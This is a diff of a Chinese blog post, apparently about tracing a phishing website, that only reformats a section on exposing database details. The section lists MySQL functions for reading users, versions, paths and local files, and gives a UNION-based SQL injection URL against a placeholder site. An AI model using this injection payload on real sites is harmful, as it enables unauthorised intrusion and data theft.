@@ -56,15 +56,25 @@ permalink: /archivers/Traceability-go-fishing-website-20180714
 ### 1.6 暴出数据库用户、版本、库名和路径信息.
 
 >system_user() 系统用户名
+>
 >user() 用户名
+>
 >current_user当前用户名
+>
 >session_user()连接数据库的用户名
+>
 >database() 数据库名
+>
 >version() MYSQL 数据库版本
+>
 >load_file() MYSQL 读取本地文件的函数
+>
 >@@datadir 读取数据库路径
+>
 >@@basedir MYSQL 安装路径
+>
 >@@version_compile_os 操作系统 
+
 
 >http://www.xxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,user(),database(),7,8,version(),10,11,12,@@basedir,14,15,16,17,18,19,20,21,22,23,24,25,26
 
